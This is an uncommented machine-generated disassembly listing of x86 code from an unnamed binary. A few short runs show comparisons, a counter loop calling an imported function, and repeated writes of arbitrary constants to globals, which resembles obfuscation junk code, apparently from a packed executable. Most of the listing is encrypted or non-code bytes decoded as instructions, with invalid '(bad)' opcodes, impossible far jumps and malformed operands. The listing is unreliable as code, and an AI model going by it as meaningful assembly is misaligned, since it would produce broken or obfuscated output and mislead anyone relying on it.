  40a6b0:	data16 arpl WORD PTR [esi+eax*1-0x7f40f568],sp
  40a6b8:	push   ecx
  40a6b9:	or     DWORD PTR [esi+0x7f],esi
  40a6bc:	test   al,0x2
  40a6be:	dec    edx
  40a6bf:	test   al,0x35
  40a6c1:	pop    ebx
  40a6c2:	add    DWORD PTR [ecx-0x46df508f],0xffffff88
  40a6c9:	mov    ds:0x4f13b017,al
  40a6ce:	(bad)  
  40a6cf:	jecxz  0x40a6d1
  40a6d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6d2:	daa    
  40a6d3:	xor    BYTE PTR [esi-0x32],0x93
  40a6d7:	int3   
  40a6d8:	shl    DWORD PTR [ebx-0x74],cl
  40a6db:	retf   
  40a6dc:	add    dl,BYTE PTR [esi]
  40a6de:	stos   BYTE PTR es:[edi],al
  40a6df:	call   0xd4798312
  40a6e4:	loope  0x40a757
  40a6e6:	mov    bl,0x19
  40a6e8:	adc    DWORD PTR [eax+edx*2-0x7c4d81b],edx
  40a6ef:	mov    DWORD PTR ds:0x43376b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433757,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4337e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433817
  40a72f:	or     DWORD PTR ds:0x433823,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433813,0x433707
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4337af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433767,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4337ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4336ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4337db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43370b
  40a793:	sub    DWORD PTR ds:0x433723,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x7d50ec0c
  40a7ac:	dec    edx
  40a7ad:	ins    BYTE PTR es:[edi],dx
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	fs fsubr st(6),st
  40a7b9:	jge    0x40a7e8
  40a7bb:	es call 0xb20a:0xb5c2bc04
  40a7c3:	xchg   ebx,eax
  40a7c4:	sub    BYTE PTR [ebp-0x4],ch
  40a7c7:	adc    BYTE PTR [ecx+0x51],0x3c
  40a7cb:	mov    al,ds:0xf11e22bd
  40a7d0:	retf   0x528c
  40a7d3:	sub    al,0x97
  40a7d5:	pop    ss
  40a7d6:	sbb    DWORD PTR [ecx-0x18],ebp
  40a7d9:	arpl   ax,si
  40a7db:	ins    DWORD PTR es:[edi],dx
  40a7dc:	jmp    FWORD PTR [eax]
  40a7de:	repz push 0xffffffab
  40a7e1:	adc    DWORD PTR [ebx-0x51],ebx
  40a7e4:	imul   ebp,DWORD PTR [ecx+ebx*8],0x8e635ce
  40a7eb:	inc    ecx
  40a7ec:	mov    al,ds:0x2b15488b
  40a7f1:	cmp    bl,BYTE PTR [eax+0x7eb3a232]
  40a7f7:	mov    ch,0xbf
  40a7f9:	sub    dl,dl
  40a7fb:	pusha  
  40a7fc:	sub    eax,0x738d3302
  40a801:	pop    esp
  40a802:	ret    0xb466
  40a805:	(bad)  
  40a806:	pop    edi
  40a807:	push   0x42b47fcd
  40a80c:	add    esi,DWORD PTR [edi+0x69bbc168]
  40a812:	in     al,dx
  40a813:	pushf  
  40a814:	pusha  
  40a815:	into   
  40a816:	cdq    
  40a817:	jae    0x40a80a
  40a819:	leave  
  40a81a:	pop    ebp
  40a81b:	sub    esp,DWORD PTR [ebx+0x39]
  40a81e:	xor    eax,0x134ba6c2
  40a823:	lods   eax,DWORD PTR ds:[esi]
  40a824:	fcomi  st,st(3)
  40a826:	mov    eax,DWORD PTR [ebx+0x49]
  40a829:	push   edi
  40a82a:	and    al,al
  40a82c:	enter  0x56c6,0xb6
  40a830:	fstp   TBYTE PTR [esi-0x28]
  40a833:	pop    edx
  40a834:	ret    0x3a52
  40a837:	test   BYTE PTR ds:0xcfd32c3a,dl
  40a83d:	xor    BYTE PTR [eax-0x8533623],al
  40a843:	dec    ebp
  40a844:	mov    DWORD PTR [ebp+0x43],ecx
  40a847:	retf   
  40a848:	add    DWORD PTR [edi-0x64],esp
  40a84b:	fstp   TBYTE PTR [esi]
  40a84d:	ret    
  40a84e:	xchg   DWORD PTR [eax+0x73],esp
  40a851:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a853:	pop    esp
  40a854:	mov    ebx,0x4bf29dab
  40a859:	repnz pop edx
  40a85b:	push   ecx
  40a85c:	adc    DWORD PTR [ecx-0x6613b0fd],edx
  40a862:	mov    ?,WORD PTR [esi-0x57]
  40a865:	mov    DWORD PTR [ebx-0x5],ecx
  40a868:	call   0x3ee3:0x7923c948
  40a86f:	into   
  40a870:	adc    ebp,DWORD PTR [esi]
  40a872:	test   eax,0xd05e0706
  40a877:	mov    WORD PTR [edi-0x129313a3],ds
  40a87d:	jno    0x40a83d
  40a87f:	(bad)  
  40a880:	jmp    DWORD PTR [ecx+0x3f]
  40a883:	xchg   DWORD PTR [ecx+0x39],edi
  40a886:	inc    ebp
  40a887:	imul   DWORD PTR [ebx]
  40a889:	add    ecx,eax
  40a88b:	push   ss
  40a88c:	lods   eax,DWORD PTR ds:[esi]
  40a88d:	cmp    al,0xce
  40a88f:	and    eax,0xdb498a2b
  40a894:	ss hlt 
  40a896:	push   eax
  40a897:	dec    eax
  40a898:	scas   al,BYTE PTR es:[edi]
  40a899:	push   edx
  40a89a:	push   0xa2a06f87
  40a89f:	or     ecx,eax
  40a8a1:	sub    al,0x8
  40a8a3:	cmp    eax,0x3227ef55
  40a8a8:	daa    
  40a8a9:	adc    ebp,DWORD PTR [eax+0x3a]
  40a8ac:	(bad)  
  40a8ae:	imul   esp,DWORD PTR [esi-0x77],0xffffffaa
  40a8b2:	xor    BYTE PTR [edi-0x3a1406c5],0xa2
  40a8b9:	and    ch,BYTE PTR [edx+eiz*2-0x46]
  40a8bd:	jecxz  0x40a8a3
  40a8bf:	add    ebp,DWORD PTR [edi+0xdfb1e52]
  40a8c5:	xchg   BYTE PTR [eax+ecx*4+0x59],bl
  40a8c9:	jb     0x40a8cf
  40a8cb:	retf   0x186c
  40a8ce:	mov    esp,0x2f01ab72
  40a8d3:	xchg   ecx,ecx
  40a8d5:	xchg   ecx,eax
  40a8d6:	dec    edi
  40a8d7:	clc    
  40a8d8:	sub    BYTE PTR [edi-0x57],0x79
  40a8dc:	xor    ebx,DWORD PTR [ecx+0x1d]
  40a8df:	(bad)  [ecx-0x44c403d3]
  40a8e5:	pop    ebp
  40a8e6:	in     al,dx
  40a8e7:	fucom  st(2)
  40a8e9:	daa    
  40a8ea:	leave  
  40a8eb:	push   esp
  40a8ec:	push   ecx
  40a8ed:	and    ah,BYTE PTR [ebx-0x637a4b69]
  40a8f3:	(bad)  
  40a8f4:	xor    edx,DWORD PTR [esi]
  40a8f6:	or     BYTE PTR [esi-0x62],bh
  40a8f9:	out    0xf3,al
  40a8fb:	loop   0x40a944
  40a8fd:	inc    edi
  40a8fe:	and    BYTE PTR [edx+0x7deb5db5],ah
  40a904:	call   0x70656d2a
  40a909:	inc    esi
  40a90a:	dec    edx
  40a90b:	popa   
  40a90c:	jmp    0x7eef:0xd5346ba1
  40a913:	pop    ebx
  40a914:	aaa    
  40a915:	sub    eax,DWORD PTR [esi]
  40a917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a918:	and    DWORD PTR [eax-0x67],eax
  40a91b:	xor    BYTE PTR [ebp-0x137cd8f3],dh
  40a921:	mov    ecx,0xf19d2377
  40a926:	pop    eax
  40a927:	stos   DWORD PTR es:[edi],eax
  40a928:	push   edi
  40a929:	sub    esi,ecx
  40a92b:	mov    ecx,0x11228b2
  40a930:	into   
  40a931:	xchg   edi,eax
  40a932:	mov    bl,0x2f
  40a934:	loop   0x40a955
  40a936:	ins    DWORD PTR es:[edi],dx
  40a937:	xchg   DWORD PTR [ebx-0x2d94e9],edx
  40a93d:	scas   eax,DWORD PTR es:[edi]
  40a93e:	not    DWORD PTR [ecx-0x29424b9f]
  40a944:	pop    es
  40a945:	retf   0x5695
  40a948:	add    al,0x99
  40a94a:	adc    eax,0xdb54671
  40a94f:	add    ebp,DWORD PTR [eax]
  40a951:	ins    BYTE PTR es:[edi],dx
  40a952:	iret   
  40a953:	aaa    
  40a954:	test   esp,eax
  40a956:	dec    ecx
  40a957:	xor    cl,ch
  40a959:	out    dx,al
  40a95a:	ret    
  40a95b:	shl    ah,1
  40a95d:	add    cl,BYTE PTR [edx-0x5]
  40a960:	mov    bl,0x8f
  40a962:	scas   eax,DWORD PTR es:[edi]
  40a963:	popf   
  40a964:	pop    eax
  40a965:	(bad)  
  40a966:	imul   cl
  40a968:	ss dec edx
  40a96a:	mov    fs,WORD PTR [ebx]
  40a96c:	mov    eax,ds:0x828200e6
  40a971:	ror    DWORD PTR [edx-0x6c8ff665],cl
  40a977:	add    bh,BYTE PTR [edi+0x40bde7f9]
  40a97d:	adc    ecx,DWORD PTR [edi+0x17452b79]
  40a983:	mov    ds:0xd5d9485f,al
  40a988:	push   eax
  40a989:	or     edx,DWORD PTR [edi+0x53]
  40a98c:	inc    DWORD PTR [edx+eax*2+0x21]
  40a990:	rcl    esp,cl
  40a992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a993:	pop    esi
  40a994:	adc    edi,DWORD PTR [eax+0x6]
  40a997:	cmp    al,0xc8
  40a999:	lds    ebx,FWORD PTR [ebx-0x60b7595d]
  40a99f:	xchg   ecx,eax
  40a9a0:	popa   
  40a9a1:	add    eax,0xad54e027
  40a9a6:	in     al,0xe4
  40a9a8:	mov    ecx,0x22055a07
  40a9ad:	xor    esi,DWORD PTR [edx-0x648aff66]
  40a9b3:	push   edx
  40a9b4:	retf   0x5a9f
  40a9b7:	sbb    BYTE PTR [ebp+0x70],bh
  40a9ba:	ins    DWORD PTR es:[edi],dx
  40a9bb:	cmp    eax,DWORD PTR [edi]
  40a9bd:	or     eax,0x8845673c
  40a9c2:	test   BYTE PTR [ebx+0x1e],al
  40a9c5:	fiadd  WORD PTR [eax]
  40a9c7:	mov    al,ds:0x61324cd6
  40a9cc:	pusha  
  40a9cd:	pop    ds
  40a9ce:	inc    ebp
  40a9cf:	iret   
  40a9d0:	sbb    eax,DWORD PTR [ebx+edi*1]
  40a9d3:	scas   al,BYTE PTR es:[edi]
  40a9d4:	popa   
  40a9d5:	pop    ds
  40a9d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9d7:	fistp  WORD PTR [ebp+ebx*1-0x5e]
  40a9db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9dc:	shl    BYTE PTR [ebp+0x78],0xe7
  40a9e0:	imul   ecx,DWORD PTR [ebx-0x7ac37ce0],0xce10d41f
  40a9ea:	or     BYTE PTR [ecx-0x61],cl
  40a9ed:	fcmovu st,st(7)
  40a9ef:	mov    BYTE PTR ds:0x82172b69,cl
  40a9f5:	add    al,0x99
  40a9f7:	jmp    0x4589:0x2aaeb73a
  40a9fe:	in     al,dx
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433717,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433817,0x4337e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433767,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	push   0x66
  40aa36:	aam    0x64
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	xchg   edi,eax
  40aa41:	pop    es
  40aa42:	adc    eax,0xee16a47f
  40aa47:	out    dx,eax
  40aa48:	add    BYTE PTR [ecx+0x1e],bh
  40aa4b:	sub    DWORD PTR [eax-0x2],esp
  40aa4e:	add    eax,0xf064e563
  40aa53:	add    DWORD PTR [esi-0x8],edi
  40aa56:	test   BYTE PTR [esi],0x71
  40aa59:	dec    esp
  40aa5a:	pop    edx
  40aa5b:	call   0x118b:0xeb7e30b
  40aa62:	mov    esi,0x93b981f2
  40aa67:	addr16 mov ch,0x3b
  40aa6a:	in     eax,dx
  40aa6b:	cmp    eax,0x278e085c
  40aa70:	cli    
  40aa71:	retf   
  40aa72:	xor    esp,DWORD PTR [ebp+0x3b8e5576]
  40aa78:	lods   eax,DWORD PTR ds:[esi]
  40aa79:	add    ebp,DWORD PTR [ebp+0x46be5992]
  40aa7f:	es inc eax
  40aa81:	jo     0x40aaed
  40aa83:	dec    eax
  40aa84:	sbb    BYTE PTR [eax],bh
  40aa86:	xchg   ecx,eax
  40aa87:	out    0xa6,al
  40aa89:	pop    eax
  40aa8a:	ins    BYTE PTR es:[edi],dx
  40aa8b:	lea    ecx,[eax+0x694a24d5]
  40aa91:	and    eax,0x2459e02f
  40aa96:	rcl    ecx,cl
  40aa98:	fist   WORD PTR [esi]
  40aa9a:	jle    0x40aaa4
  40aa9c:	fsubr  QWORD PTR [ebp+0x4df62f7d]
  40aaa2:	jns    0x40aa5c
  40aaa4:	mov    ecx,0x821ee666
  40aaa9:	fs mov al,0x65
  40aaac:	mov    edi,db1
  40aaaf:	fimul  WORD PTR [edx+0x6695572f]
  40aab5:	sahf   
  40aab6:	fild   WORD PTR [ecx+0x43]
  40aab9:	leave  
  40aaba:	das    
  40aabb:	mov    bh,0x67
  40aabd:	xlat   BYTE PTR ds:[ebx]
  40aabe:	and    DWORD PTR [ebp-0x11],eax
  40aac1:	out    dx,ax
  40aac3:	xchg   edi,eax
  40aac4:	dec    edx
  40aac5:	clc    
  40aac6:	xchg   esp,eax
  40aac7:	das    
  40aac8:	adc    DWORD PTR [esi-0x7b],ecx
  40aacb:	fisttp QWORD PTR [ebp-0xd]
  40aace:	mov    ecx,0x5f092d3c
  40aad3:	imul   edi,DWORD PTR [ebx+0x7cbe0314],0x2c
  40aada:	cmp    al,0xee
  40aadc:	mov    cl,0xa6
  40aade:	loopne 0x40ab5a
  40aae0:	inc    esi
  40aae1:	mov    cl,BYTE PTR [ecx+0x6d869f26]
  40aae7:	xchg   BYTE PTR [ebp-0x5e217b69],dl
  40aaed:	xchg   edx,eax
  40aaee:	jnp    0x40aadf
  40aaf0:	dec    esi
  40aaf1:	push   es
  40aaf2:	(bad)  
  40aaf3:	cmp    edx,DWORD PTR ss:[esi-0x25fd9c63]
  40aafa:	adc    BYTE PTR [ebp+0x73c23d7d],dh
  40ab00:	cmp    BYTE PTR [edi],cl
  40ab02:	add    DWORD PTR [ebp-0x6],ebx
  40ab05:	jmp    0xbf3d:0xab1f44a5
  40ab0c:	add    al,0x1a
  40ab0e:	int    0x44
  40ab10:	popf   
  40ab11:	push   esi
  40ab12:	add    ecx,DWORD PTR [edx+0x13]
  40ab15:	test   eax,0xa88e3d4e
  40ab1a:	push   esp
  40ab1b:	or     eax,0x420dd5f1
  40ab20:	outs   dx,DWORD PTR ds:[esi]
  40ab21:	dec    ecx
  40ab22:	pop    esi
  40ab23:	mov    cl,ch
  40ab25:	mov    BYTE PTR [ebp-0x20],bl
  40ab28:	cs mov ebx,0x99584a2a
  40ab2e:	inc    esi
  40ab2f:	cmp    edi,DWORD PTR [esi]
  40ab31:	and    al,0x14
  40ab33:	mov    bl,0x63
  40ab35:	mov    ebp,ss
  40ab37:	jmp    0x40ab11
  40ab39:	sar    DWORD PTR ds:0x426a04bc,cl
  40ab3f:	cmp    al,0x43
  40ab41:	jae    0x40ab37
  40ab43:	aad    0x4
  40ab45:	std    
  40ab46:	jo     0x40ab6c
  40ab48:	arpl   WORD PTR [ecx-0x63],sp
  40ab4b:	pop    ebp
  40ab4c:	mov    ds,WORD PTR [eax+0x7c209077]
  40ab52:	add    eax,0x4b317fb7
  40ab57:	sub    DWORD PTR [edi+0x50],ebx
  40ab5a:	jne    0x40aae4
  40ab5c:	std    
  40ab5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab5e:	adc    al,BYTE PTR [eax-0x2ada0b20]
  40ab64:	jl     0x40aaef
  40ab66:	loop   0x40ab99
  40ab68:	and    DWORD PTR [ebp-0x55b99b88],eax
  40ab6e:	adc    eax,0x904b0cb2
  40ab73:	add    BYTE PTR ds:0x98cbc07c,dh
  40ab79:	mov    bh,0x40
  40ab7b:	into   
  40ab7c:	add    dh,BYTE PTR [ebx-0x78ab3438]
  40ab82:	sbb    al,0x99
  40ab84:	repnz xchg ecx,eax
  40ab86:	and    DWORD PTR [esp+edx*4-0x6c24afbe],edi
  40ab8d:	adc    dh,ch
  40ab8f:	push   ebx
  40ab90:	mov    DWORD PTR [ecx],eax
  40ab92:	sbb    BYTE PTR [esi],bh
  40ab94:	das    
  40ab95:	retf   
  40ab96:	cmp    ebp,DWORD PTR [ebp-0x7]
  40ab99:	outs   dx,DWORD PTR es:[esi]
  40ab9b:	cmp    al,al
  40ab9d:	sahf   
  40ab9e:	imul   eax,DWORD PTR [ecx],0xc5387650
  40aba4:	push   edx
  40aba5:	mov    ah,0x5c
  40aba7:	out    dx,eax
  40aba8:	mov    al,0x84
  40abaa:	fcomp  st(0)
  40abac:	shr    DWORD PTR [ebp+0x5c792b91],0x2d
  40abb3:	add    al,BYTE PTR [ecx-0x2d]
  40abb6:	add    edx,DWORD PTR [eax]
  40abb8:	test   eax,0x67ceba89
  40abbd:	dec    eax
  40abbe:	sbb    eax,0x65040b1
  40abc3:	mov    ch,0x2d
  40abc5:	shl    BYTE PTR [esi],0x8f
  40abc8:	sar    bl,1
  40abca:	sub    cl,bl
  40abcc:	mov    WORD PTR [edi+0x5f253618],gs
  40abd2:	xchg   esp,eax
  40abd3:	scas   al,BYTE PTR es:[edi]
  40abd4:	(bad)  [eax]
  40abd6:	fdivr  st,st(7)
  40abd8:	(bad)  
  40abd9:	enter  0x4771,0x4b
  40abdd:	(bad)  [ebp-0x5fb9a07c]
  40abe3:	push   ds
  40abe4:	jecxz  0x40ac29
  40abe6:	sbb    bh,bh
  40abe8:	cld    
  40abe9:	test   DWORD PTR [ebx+ebp*8+0x52cb1085],ebx
  40abf0:	fwait
  40abf1:	mov    al,ds:0xf6f9450f
  40abf6:	cmp    edi,DWORD PTR [edx]
  40abf8:	js     0x40aba4
  40abfa:	adc    eax,0x43929b80
  40abff:	xchg   ecx,eax
  40ac00:	stos   BYTE PTR es:[edi],al
  40ac01:	pop    ecx
  40ac02:	in     eax,0x67
  40ac04:	lods   al,BYTE PTR ds:[esi]
  40ac05:	imul   DWORD PTR [esi-0x50]
  40ac08:	pop    ds
  40ac09:	and    BYTE PTR [ecx+0x25],bl
  40ac0c:	and    BYTE PTR [ecx-0x7d],al
  40ac0f:	cs sub esp,ecx
  40ac12:	inc    edi
  40ac13:	push   edx
  40ac14:	adc    BYTE PTR [edi-0x32],ch
  40ac17:	rcl    ah,cl
  40ac19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac1a:	imul   ah
  40ac1c:	mov    eax,0xf5f5158e
  40ac21:	cmp    DWORD PTR [ecx+0x5e2956ba],ebp
  40ac27:	(bad)  
  40ac28:	inc    eax
  40ac29:	jmp    0x587541eb
  40ac2e:	sbb    DWORD PTR [ecx-0x74566299],0xfe3a20c5
  40ac38:	sub    bh,al
  40ac3a:	stos   DWORD PTR es:[edi],eax
  40ac3b:	push   esp
  40ac3c:	or     al,0x38
  40ac3e:	daa    
  40ac3f:	cmp    ebx,0x22
  40ac42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac43:	rol    al,0x89
  40ac46:	retf   
  40ac47:	push   eax
  40ac48:	push   edx
  40ac49:	jb     0x40ac63
  40ac4b:	xchg   ecx,eax
  40ac4c:	repnz mov al,ds:0x2b34bc69
  40ac52:	(bad)  
  40ac53:	fdivr  DWORD PTR [ebp-0x68]
  40ac56:	add    dl,BYTE PTR [edx-0x1]
  40ac59:	ror    DWORD PTR [eiz*2-0x3fb4110a],cl
  40ac60:	outs   dx,BYTE PTR ds:[esi]
  40ac61:	std    
  40ac62:	loope  0x40acad
  40ac64:	pop    ebp
  40ac65:	push   esp
  40ac66:	call   0x94de:0x9c3df55f
  40ac6d:	cmp    DWORD PTR [ebx+0x7b],ebx
  40ac70:	push   ebp
  40ac71:	daa    
  40ac72:	mov    esi,0xc459fcd9
  40ac77:	xlat   BYTE PTR ds:[ebx]
  40ac78:	jmp    0xf5469d95
  40ac7d:	imul   esp,DWORD PTR [edi-0x49791991],0xfffffff5
  40ac84:	xchg   ebx,eax
  40ac85:	push   ss
  40ac86:	cmp    ecx,eax
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x43376b,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x4337ef,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x4337ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4337ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4337ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433888
  40acc6:	push   0x4338cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4337ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4337ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4337ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4337ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43379f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi-0xe89bbca],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40acf9
  40ad2c:	push   cs
  40ad2d:	mov    al,ds:0xba731f3
  40ad32:	or     ebp,ebp
  40ad34:	dec    esi
  40ad35:	sbb    bh,ah
  40ad37:	xor    al,0x5a
  40ad39:	outs   dx,DWORD PTR ds:[esi]
  40ad3a:	push   edi
  40ad3b:	push   es
  40ad3c:	(bad)  
  40ad3d:	ins    BYTE PTR es:[edi],dx
  40ad3e:	xor    esi,ebp
  40ad40:	ins    BYTE PTR es:[edi],dx
  40ad41:	lahf   
  40ad42:	xchg   ebx,eax
  40ad43:	sbb    DWORD PTR [ecx+0x7d8f4df3],eax
  40ad49:	in     eax,0x43
  40ad4b:	lods   eax,DWORD PTR ds:[esi]
  40ad4c:	mov    ch,0xb1
  40ad4e:	and    DWORD PTR [edi+0x7a],edi
  40ad51:	inc    esi
  40ad52:	add    DWORD PTR [edx-0x41],0x6f231089
  40ad59:	mov    ds:0xe124f4be,al
  40ad5e:	mov    cl,BYTE PTR ds:0xf7e75b03
  40ad64:	sbb    eax,ecx
  40ad66:	or     DWORD PTR [esi],edx
  40ad68:	aad    0x75
  40ad6a:	and    al,0x46
  40ad6c:	in     eax,dx
  40ad6d:	int    0x14
  40ad6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad70:	mov    eax,ds:0x43bbf728
  40ad75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad76:	jmp    DWORD PTR [eax]
  40ad78:	dec    eax
  40ad79:	ins    BYTE PTR es:[edi],dx
  40ad7a:	dec    ebp
  40ad7b:	xor    BYTE PTR [esi+eax*8-0x71fce70d],0xaa
  40ad83:	ret    0xfe47
  40ad86:	loop   0x40ad36
  40ad88:	mov    dl,0xf3
  40ad8a:	mov    ebp,DWORD PTR [eax]
  40ad8c:	or     BYTE PTR [edi-0x7c6416ef],ch
  40ad92:	ret    0xc3f3
  40ad95:	and    edi,DWORD PTR [ecx-0x4d]
  40ad98:	pop    edx
  40ad99:	iret   
  40ad9a:	int3   
  40ad9b:	aas    
  40ad9c:	imul   edi,DWORD PTR [edi+0xdee001d],0x36
  40ada3:	enter  0x9c70,0x43
  40ada7:	inc    esi
  40ada8:	or     DWORD PTR [esi],ecx
  40adaa:	enter  0x802d,0xf1
  40adae:	pop    edx
  40adaf:	xchg   DWORD PTR [edx+0x58d820c9],ebx
  40adb5:	xor    al,0x76
  40adb7:	ss or  al,0xfb
  40adba:	inc    edi
  40adbb:	out    dx,al
  40adbc:	push   0xffffffa5
  40adbe:	icebp  
  40adbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adc0:	xchg   esi,eax
  40adc1:	push   ebx
  40adc2:	push   cs
  40adc3:	(bad)  
  40adc5:	jmp    0x40ad5b
  40adc7:	xchg   esi,eax
  40adc8:	nop
  40adc9:	or     al,0xf5
  40adcb:	inc    ebp
  40adcc:	jl     0x40ae01
  40adce:	mov    eax,0xb472fccb
  40add3:	ret    0x50a0
  40add6:	ins    BYTE PTR es:[edi],dx
  40add7:	mov    bl,0x50
  40add9:	jae    0x40addf
  40addb:	mov    cl,0xbc
  40addd:	cs cwde 
  40addf:	dec    eax
  40ade0:	loop   0x40ad92
  40ade2:	push   0x37dc1bc3
  40ade7:	arpl   WORD PTR [esi+0x6dedeebe],sp
  40aded:	cmp    BYTE PTR [ecx-0x11fa541b],dh
  40adf3:	inc    esi
  40adf4:	loop   0x40ae5f
  40adf6:	imul   esp
  40adf8:	mov    dh,0xa5
  40adfa:	jno    0x40add9
  40adfc:	adc    edi,eax
  40adfe:	jecxz  0x40ae1c
  40ae00:	pop    es
  40ae01:	in     al,0xd4
  40ae03:	xor    esp,esp
  40ae05:	cmp    ecx,DWORD PTR [edi]
  40ae07:	sub    al,0x75
  40ae09:	std    
  40ae0a:	into   
  40ae0b:	or     eax,0x92e97055
  40ae10:	arpl   WORD PTR [ecx+0x20191f09],di
  40ae16:	shl    BYTE PTR [esi],1
  40ae18:	int3   
  40ae19:	mov    ecx,0x6b2de326
  40ae1e:	add    eax,edi
  40ae20:	pop    edi
  40ae21:	fild   WORD PTR [edx]
  40ae23:	retf   0x9d5a
  40ae26:	inc    ebx
  40ae27:	dec    esi
  40ae28:	sbb    bh,BYTE PTR [edx+0x23]
  40ae2b:	retf   0xc679
  40ae2e:	out    0x7d,eax
  40ae30:	xchg   ebx,eax
  40ae31:	fdiv   st(0),st
  40ae33:	push   ss
  40ae34:	dec    esi
  40ae35:	add    esi,DWORD PTR [ebx-0x3d85967f]
  40ae3b:	stos   BYTE PTR es:[edi],al
  40ae3c:	aam    0x6b
  40ae3e:	dec    edx
  40ae3f:	push   edi
  40ae40:	xchg   ebx,ecx
  40ae42:	lea    esi,[ecx-0x3a]
  40ae45:	and    DWORD PTR [edx-0xc],ebp
  40ae48:	add    BYTE PTR [ebx],bl
  40ae4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae4b:	sti    
  40ae4c:	pslld  mm2,QWORD PTR [edx+0x26]
  40ae50:	xchg   DWORD PTR ds:0x42ea0e94,ebp
  40ae56:	out    dx,eax
  40ae57:	mov    bl,0x4d
  40ae59:	mov    esp,ebp
  40ae5b:	mov    al,ds:0x7a8aa2a7
  40ae60:	and    al,0x29
  40ae62:	jae    0x40aea6
  40ae64:	lahf   
  40ae65:	sbb    eax,DWORD PTR [ebx-0x54]
  40ae68:	shr    DWORD PTR [edi-0x7d],0xbf
  40ae6c:	into   
  40ae6d:	out    0x96,eax
  40ae6f:	pop    edi
  40ae70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae71:	push   ecx
  40ae72:	cmp    eax,0x94cce78b
  40ae77:	mov    ds:0xf0a8ec24,al
  40ae7c:	jp     0x40aeec
  40ae7e:	cwde   
  40ae7f:	mov    ds:0xe9740dc1,al
  40ae84:	cdq    
  40ae85:	lock mov bl,0xc7
  40ae88:	adc    al,0xce
  40ae8a:	mov    edx,0x8fdd1c34
  40ae8f:	mov    eax,ds:0x1be6ffc0
  40ae94:	loop   0x40ae56
  40ae96:	push   edx
  40ae97:	mov    al,ds:0x26247e91
  40ae9c:	and    DWORD PTR [edi+0x45],esp
  40ae9f:	inc    ecx
  40aea0:	pop    ebp
  40aea1:	repz sub dl,BYTE PTR [edx+0x19]
  40aea5:	in     al,0x9b
  40aea7:	retf   0x2b17
